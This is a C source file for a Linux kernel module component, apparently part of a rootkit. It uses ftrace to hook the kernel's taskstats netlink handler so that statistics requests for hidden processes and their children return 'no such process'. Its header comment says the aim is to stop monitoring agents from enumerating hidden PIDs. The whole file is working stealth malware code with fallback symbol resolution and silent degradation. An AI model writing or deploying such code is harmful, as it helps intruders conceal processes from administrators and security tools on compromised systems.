/* taskstats_hook.c   Filter taskstats NETLINK_GENERIC responses for hidden PIDs.
 *
 * taskstats allows reading per-process CPU/memory accounting via netlink even
 * when /proc is hidden. Without this module, `getconf` / `cgacct` / monitoring
 * agents can enumerate hidden PIDs through TASKSTATS_CMD_GET.
 *
 * Strategy:
 *   Hook taskstats_reply_cmd (kernel/taskstats.c static fn, kallsyms-visible)
 *   and return -ESRCH for any requested PID that is hidden.
 *   Fallback: if taskstats_reply_cmd is unavailable, hook taskstats_user_cmd
 *   (older kernel naming). If neither is found, silent no-op (graceful degradation).
 *
 * Implementation note:
 *   Both candidate functions share the signature:
 *     int fn(struct sk_buff *skb, struct nlmsghdr *nlh, struct netlink_ext_ack *extack)
 *   We parse the TASKSTATS_CMD_ATTR_PID / TASKSTATS_CMD_ATTR_TGID attribute
 *   from nlh to get the requested PID before calling the original.
 */
#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/pid_manager.h"
#include "../include/taskstats_hook.h"
#include <linux/genetlink.h>
#include <linux/taskstats.h>

/* taskstats_reply_cmd / taskstats_user_cmd signature */
typedef int (*taskstats_cmd_fn_t)(struct sk_buff *skb,
                                   struct nlmsghdr *nlh,
                                   struct netlink_ext_ack *extack);

static taskstats_cmd_fn_t orig_taskstats_cmd = NULL;
static struct ftrace_hook taskstats_hook_entry;
static bool taskstats_hook_installed = false;

/*  PID extraction from TASKSTATS_CMD_GET nlh                     */

static notrace pid_t extract_taskstats_pid(struct nlmsghdr *nlh)
{
    struct nlattr *na;
    int rlen;
    u32 pid = 0;

    if (!nlh || nlh->nlmsg_len < NLMSG_HDRLEN)
        return 0;

    /* Skip genlmsghdr */
    na   = (struct nlattr *)((char *)nlmsg_data(nlh) + GENL_HDRLEN);
    rlen = (int)nlmsg_len(nlh) - GENL_HDRLEN;

    while (nla_ok(na, rlen)) {
        if (nla_type(na) == TASKSTATS_CMD_ATTR_PID ||
            nla_type(na) == TASKSTATS_CMD_ATTR_TGID) {
            if (nla_len(na) >= (int)sizeof(u32)) {
                pid = nla_get_u32(na);
                break;
            }
        }
        na = nla_next(na, &rlen);
    }

    return (pid_t)pid;
}

/*  Hook function                                                 */

static notrace int hook_taskstats_cmd(struct sk_buff *skb,
                                       struct nlmsghdr *nlh,
                                       struct netlink_ext_ack *extack)
{
    pid_t pid;

    if (!orig_taskstats_cmd)
        return -ENOSYS;

    pid = extract_taskstats_pid(nlh);
    if (pid > 0 && (is_hidden_pid(pid) || is_child_pid(pid)))
        return -ESRCH;

    return orig_taskstats_cmd(skb, nlh, extack);
}

/*  Init / Exit                                                   */

static const char *taskstats_candidates[] = {
    "taskstats_reply_cmd",
    "taskstats_user_cmd",
    NULL,
};

int taskstats_hook_init(void)
{
    int i;

    for (i = 0; taskstats_candidates[i] != NULL; i++) {
        void *sym = resolve_sym(taskstats_candidates[i]);
        if (!sym)
            continue;

        orig_taskstats_cmd = (taskstats_cmd_fn_t)sym;
        memset(&taskstats_hook_entry, 0, sizeof(taskstats_hook_entry));
        taskstats_hook_entry.name    = taskstats_candidates[i];
        taskstats_hook_entry.function = (void *)hook_taskstats_cmd;
        taskstats_hook_entry.original = (void **)&orig_taskstats_cmd;

        if (fh_install_hook(&taskstats_hook_entry) == 0) {
            taskstats_hook_installed = true;
            return 0;
        }

        orig_taskstats_cmd = NULL;
    }

    /* Graceful no-op   taskstats not a common vector */
    return 0;
}

void taskstats_hook_exit(void)
{
    if (taskstats_hook_installed) {
        fh_remove_hook(&taskstats_hook_entry);
        taskstats_hook_installed = false;
        orig_taskstats_cmd = NULL;
    }
}
